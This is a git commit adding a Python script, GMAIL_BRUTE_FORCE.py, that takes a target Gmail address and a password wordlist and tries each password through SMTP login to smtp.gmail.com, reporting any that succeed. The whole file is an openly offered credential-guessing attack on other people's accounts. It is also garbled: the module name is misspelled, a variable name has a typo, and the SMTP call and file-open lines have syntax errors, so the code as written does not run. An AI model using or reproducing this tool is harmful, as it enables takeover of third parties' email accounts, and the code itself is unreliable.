d486d8fe896978c1c018485cc7aa6ed66ff54963
clash <35383814+yazeed33@users.noreply.github.com>
2018-09-20 13:23:03 +0300

    Update GMAIL_BRUTE_FORCE.py

--- GMAIL_BRUTE_FORCE.py
+++ GMAIL_BRUTE_FORCE.py
@@ -1,1 +1,24 @@
-print("")
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+print("+                                                          +")
+print("+               [!] powered by yazeed [!]                  +")
+print("+                                                          +")
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+
+import smplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com" 587)
+smtpserve.ehlo()
+smtpserver.starttls()
+
+email = raw_input("Enter Email Targets: ")
+passwfile = raw_input("Enter WordList File: ")
+passwfile = open("passwfile,"r")
+                 
+for password in passwfile:
+    try:
+       smtpserver.login(email,password)
+       print("[+] PASS FOND ===> %s ") % password
+       break;
+                 
+    except smtplib.SMTPAuthenticationError:
+       print("[!] PASS INCORRECT ===> %s ") % password
